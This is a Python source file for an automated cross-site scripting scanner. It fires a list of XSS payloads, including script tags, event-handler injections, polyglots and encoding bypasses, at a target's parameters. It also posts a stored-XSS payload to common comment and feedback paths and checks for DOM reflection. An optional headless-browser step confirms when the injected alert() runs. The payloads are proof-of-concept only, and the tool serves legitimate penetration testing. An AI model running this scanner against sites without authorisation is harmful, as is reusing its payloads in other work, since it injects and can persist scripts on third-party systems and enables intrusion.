import httpx, re, urllib.parse, json, asyncio

XSS_PAYLOADS = [
    ("basic", "<script>alert(1)</script>"),
    ("img_onerror", "<img src=x onerror=alert(1)>"),
    ("svg_onload", "<svg onload=alert(1)>"),
    ("body_onload", "<body onload=alert(1)>"),
    ("iframe", "<iframe src=javascript:alert(1)>"),
    ("details", "<details open ontoggle=alert(1)>"),
    ("input_focus", "<input autofocus onfocus=alert(1)>"),
    ("polyglot", "\"'><img src=x onerror=alert(1)>"),
    ("url_encoded", "%3Cscript%3Ealert(1)%3C/script%3E"),
    ("unicode_bypass", "<script>\\u0061lert(1)</script>"),
    ("onerror_poly", "\"\"'--></style></script><img src=x onerror=alert(1)>"),
    ("xss_in_json", "{\\\"xss\\\":\\\"<img src=x onerror=alert(1)>\\\"}"),
]

STORED_PATHS = ["/comment", "/post", "/submit", "/feedback", "/review", "/contact", "/api/feedback", "/api/comment"]

async def xss_detect(target: str, param: str = "", method: str = "get", use_browser: bool = False) -> dict:
    results = []
    parsed = urllib.parse.urlparse(target)
    params = urllib.parse.parse_qs(parsed.query)
    base = target.rstrip("/")
    
    test_params = [param] if param else list(params.keys()) if params else ["q", "search", "s", "id", "page"]
    
    async with httpx.AsyncClient(timeout=15.0, verify=False) as client:
        # — REFLECTED XSS —
        if params or test_params:
            for p in test_params:
                for payload_name, payload in XSS_PAYLOADS:
                    try:
                        if method == "get":
                            new_params = {k: v[0] for k, v in params.items()} if params else {p: payload}
                            new_params[p] = payload
                            url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(new_params)}"
                            resp = await client.get(url)
                        else:
                            resp = await client.post(target, data={p: payload})
                        
                        body = resp.text
                        payl = payload[:20].replace("\\", "")
                        reflected = payl in body
                        
                        if reflected:
                            context = "unknown"
                            if re.search(rf'>\s*{re.escape(payl)}', body):
                                context = "html_context"
                            elif re.search(rf'<script[^>]*>[^<]*{re.escape(payl)}', body):
                                context = "script_context"
                            elif re.search(rf'=[\s"\']*{re.escape(payl)}', body):
                                context = "attribute_context"
                            elif re.search(rf'//{re.escape(payl)}', body):
                                context = "js_comment"
                            
                            results.append({
                                "type": "reflected",
                                "param": p,
                                "payload": payload_name,
                                "context": context,
                                "status": resp.status_code,
                                "risk": "CRITICAL",
                            })
                    except:
                        pass
        
        # — STORED XSS —
        for path in STORED_PATHS:
            try:
                store_url = base + path
                # Submit XSS payload
                store_payload = "<script>alert(document.domain)</script>"
                submit_resp = await client.post(store_url, data={
                    "name": "test",
                    "email": "test@test.com",
                    "message": store_payload,
                    "comment": store_payload,
                    "feedback": store_payload,
                    "content": store_payload,
                })
                if submit_resp.status_code in [200, 201, 302]:
                    # Check if stored on same page
                    check = await client.get(store_url)
                    if store_payload[:20] in check.text:
                        results.append({
                            "type": "stored",
                            "path": path,
                            "payload": "stored_xss",
                            "note": "XSS payload persisted and reflected",
                            "risk": "CRITICAL",
                        })
                    # Also check redirect target
                    if submit_resp.status_code == 302:
                        loc = submit_resp.headers.get("location", "")
                        if loc:
                            try:
                                loc_resp = await client.get(urllib.parse.urljoin(base, loc))
                                if store_payload[:20] in loc_resp.text:
                                    results.append({
                                        "type": "stored_xss_redirect",
                                        "path": path,
                                        "redirect": loc,
                                        "risk": "CRITICAL",
                                    })
                            except:
                                pass
            except:
                pass
        
        # — DOM XSS (check for URL param reflection in JS context) —
        try:
            resp = await client.get(target)
            html = resp.text
            # Check if any URL params are reflected in script blocks
            if params:
                for p in list(params.keys())[:3]:
                    if p in html:
                        # Check if param value appears in JS context
                        script_blocks = re.findall(r'<script[^>]*>([\s\S]*?)</script>', html, re.I)
                        for script in script_blocks:
                            if p in script:
                                results.append({
                                    "type": "dom_based_xss",
                                    "param": p,
                                    "note": f"Parameter '{p}' appears in JavaScript block — potential DOM XSS",
                                    "risk": "HIGH",
                                })
                                break
        except:
            pass
        
        # — BROWSER-BASED XSS (Playwright) —
        if use_browser:
            try:
                from playwright.async_api import async_playwright
                async with async_playwright() as pw:
                    browser = await pw.chromium.launch(headless=True)
                    page = await browser.new_page()
                    
                    # Test reflected XSS with browser
                    if params:
                        for p in test_params[:3]:
                            new_params = {k: v[0] for k, v in params.items()}
                            new_params[p] = "<img src=x onerror=alert(1)>"
                            url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(new_params)}"
                            try:
                                await page.goto(url, timeout=10000)
                                dialog_handled = False
                                async def handle_dialog(dialog):
                                    nonlocal dialog_handled
                                    dialog_handled = True
                                    await dialog.dismiss()
                                page.on("dialog", handle_dialog)
                                await asyncio.sleep(1)
                                if dialog_handled:
                                    results.append({
                                        "type": "browser_xss",
                                        "param": p,
                                        "payload": "onerror_alert",
                                        "note": "alert() executed in browser — confirmed XSS",
                                        "risk": "CRITICAL",
                                    })
                            except:
                                pass
                    
                    await browser.close()
            except ImportError:
                results.append({"type": "browser_xss", "note": "Playwright not installed — use: pip install playwright && playwright install chromium", "risk": "INFO"})
            except Exception as e:
                results.append({"type": "browser_xss", "error": str(e)[:80], "risk": "INFO"})
    
    return {"target": target, "results": results, "vulnerable": any(r.get("risk") in ["CRITICAL", "HIGH"] for r in results), "total_findings": len(results)}
